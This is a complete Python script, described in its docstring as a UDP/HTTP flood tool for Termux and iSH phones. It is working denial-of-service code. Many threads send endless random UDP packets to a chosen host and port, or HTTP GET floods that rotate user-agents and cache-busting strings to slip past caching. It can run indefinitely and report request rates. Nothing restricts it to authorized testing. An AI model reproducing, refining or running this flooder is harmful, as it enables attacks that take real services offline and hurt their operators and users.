#!/usr/bin/env python3
"""Simple threaded UDP / HTTP flood tool for Termux and iSH."""
import argparse, random, socket, sys, threading, time
from urllib.parse import urlsplit
from urllib.request import Request, urlopen

stop = threading.Event()
hits = 0
bytes_sent = 0
lock = threading.Lock()

UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "curl/8.4.0",
]

def bump(n):
    global hits, bytes_sent
    with lock:
        hits += 1
        bytes_sent += n

def rand_ua():
    return random.choice(UAS)

def cachebust():
    return "?_=%d%d" % (int(time.time() * 1000), random.randint(0, 99999))

def rand_bytes(n):
    if hasattr(random, "randbytes"):
        return random.randbytes(n)
    return bytes(random.getrandbits(8) for _ in range(n))

def drain(sock, limit=64 * 1024):
    """Read a full HTTP response so keep-alive stays in sync. Returns bytes read."""
    buf = b""
    while b"\r\n\r\n" not in buf:
        chunk = sock.recv(4096)
        if not chunk:
            return len(buf)
        buf += chunk
        if len(buf) >= limit:
            return len(buf)
    head, _, body = buf.partition(b"\r\n\r\n")
    total = len(buf)
    clen, chunked = 0, False
    for line in head.split(b"\r\n")[1:]:
        key, _, val = line.partition(b":")
        key, val = key.strip().lower(), val.strip().lower()
        if key == b"content-length":
            try:
                clen = int(val)
            except ValueError:
                clen = 0
        elif key == b"transfer-encoding" and b"chunked" in val:
            chunked = True
    if chunked:
        while b"\r\n0\r\n\r\n" not in body and not body.endswith(b"0\r\n\r\n"):
            chunk = sock.recv(4096)
            if not chunk:
                break
            body += chunk
            total += len(chunk)
            if total >= limit:
                break
    else:
        remaining = clen - len(body)
        while remaining > 0:
            chunk = sock.recv(min(4096, remaining))
            if not chunk:
                break
            remaining -= len(chunk)
            total += len(chunk)
    return total

def udp_worker(host, port, size):
    while not stop.is_set():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            payload = rand_bytes(size)
            while not stop.is_set():
                n = random.randint(max(1, size // 2), size)
                s.sendto(payload[:n], (host, port))
                bump(n)
            s.close()
        except OSError:
            time.sleep(0.05)

def http_worker(url, timeout, keepalive):
    parts = urlsplit(url)
    host = parts.hostname
    port = parts.port or (443 if parts.scheme == "https" else 80)
    path = parts.path or "/"
    if parts.query:
        path += "?" + parts.query
    use_tls = parts.scheme == "https"

    while not stop.is_set():
        try:
            if use_tls:
                req = Request(url + cachebust(), headers={"User-Agent": rand_ua(), "Connection": "close"})
                with urlopen(req, timeout=timeout) as r:
                    body = r.read(2048)
                bump(len(body) + 300)
            else:
                s = socket.create_connection((host, port), timeout=timeout)
                req = (
                    "GET %s HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\n"
                    "Accept: */*\r\nAccept-Encoding: gzip, deflate\r\n"
                    "Connection: keep-alive\r\n\r\n" % (path, host, rand_ua())
                ).encode()
                for _ in range(keepalive):
                    if stop.is_set():
                        break
                    s.sendall(req)
                    bump(len(req) + drain(s))
                s.close()
        except Exception:
            time.sleep(0.05)

def stats():
    global hits, bytes_sent
    last = 0
    while not stop.is_set():
        time.sleep(1)
        with lock:
            cur, b = hits, bytes_sent
        rate, last = cur - last, cur
        print("\r  %d req/s   %.1f KB/s   total %d   " % (rate, b / 1024.0, cur), end="", flush=True)

def main():
    p = argparse.ArgumentParser()
    p.add_argument("target", help="hostname/IP for udp, full URL for http")
    p.add_argument("-m", "--mode", choices=["udp", "http", "both"], default="udp")
    p.add_argument("-p", "--port", type=int, default=80, help="udp port")
    p.add_argument("-t", "--threads", type=int, default=100)
    p.add_argument("-s", "--size", type=int, default=1200, help="max udp payload bytes")
    p.add_argument("-d", "--duration", type=int, default=0, help="seconds, 0 = until Ctrl+C")
    p.add_argument("--timeout", type=float, default=5.0)
    p.add_argument("--keepalive", type=int, default=20, help="requests per TCP connection")
    a = p.parse_args()

    if a.mode in ("http", "both") and not a.target.startswith(("http://", "https://")):
        sys.exit("http mode needs a full URL, e.g. http://example.com/")

    threading.Thread(target=stats, daemon=True).start()
    workers = []
    for i in range(a.threads):
        if a.mode == "udp" or (a.mode == "both" and i % 2 == 0):
            workers.append(threading.Thread(target=udp_worker, args=(a.target, a.port, a.size), daemon=True))
        else:
            workers.append(threading.Thread(target=http_worker, args=(a.target, a.timeout, a.keepalive), daemon=True))

    print("target=%s mode=%s threads=%d  (Ctrl+C to stop)" % (a.target, a.mode, a.threads))
    for w in workers:
        w.start()

    try:
        if a.duration:
            time.sleep(a.duration)
            stop.set()
        else:
            while True:
                time.sleep(1)
    except KeyboardInterrupt:
        stop.set()

    print("\nstopping...")
    time.sleep(0.5)
    print("final: %d packets/requests" % hits)

if __name__ == "__main__":
    main()
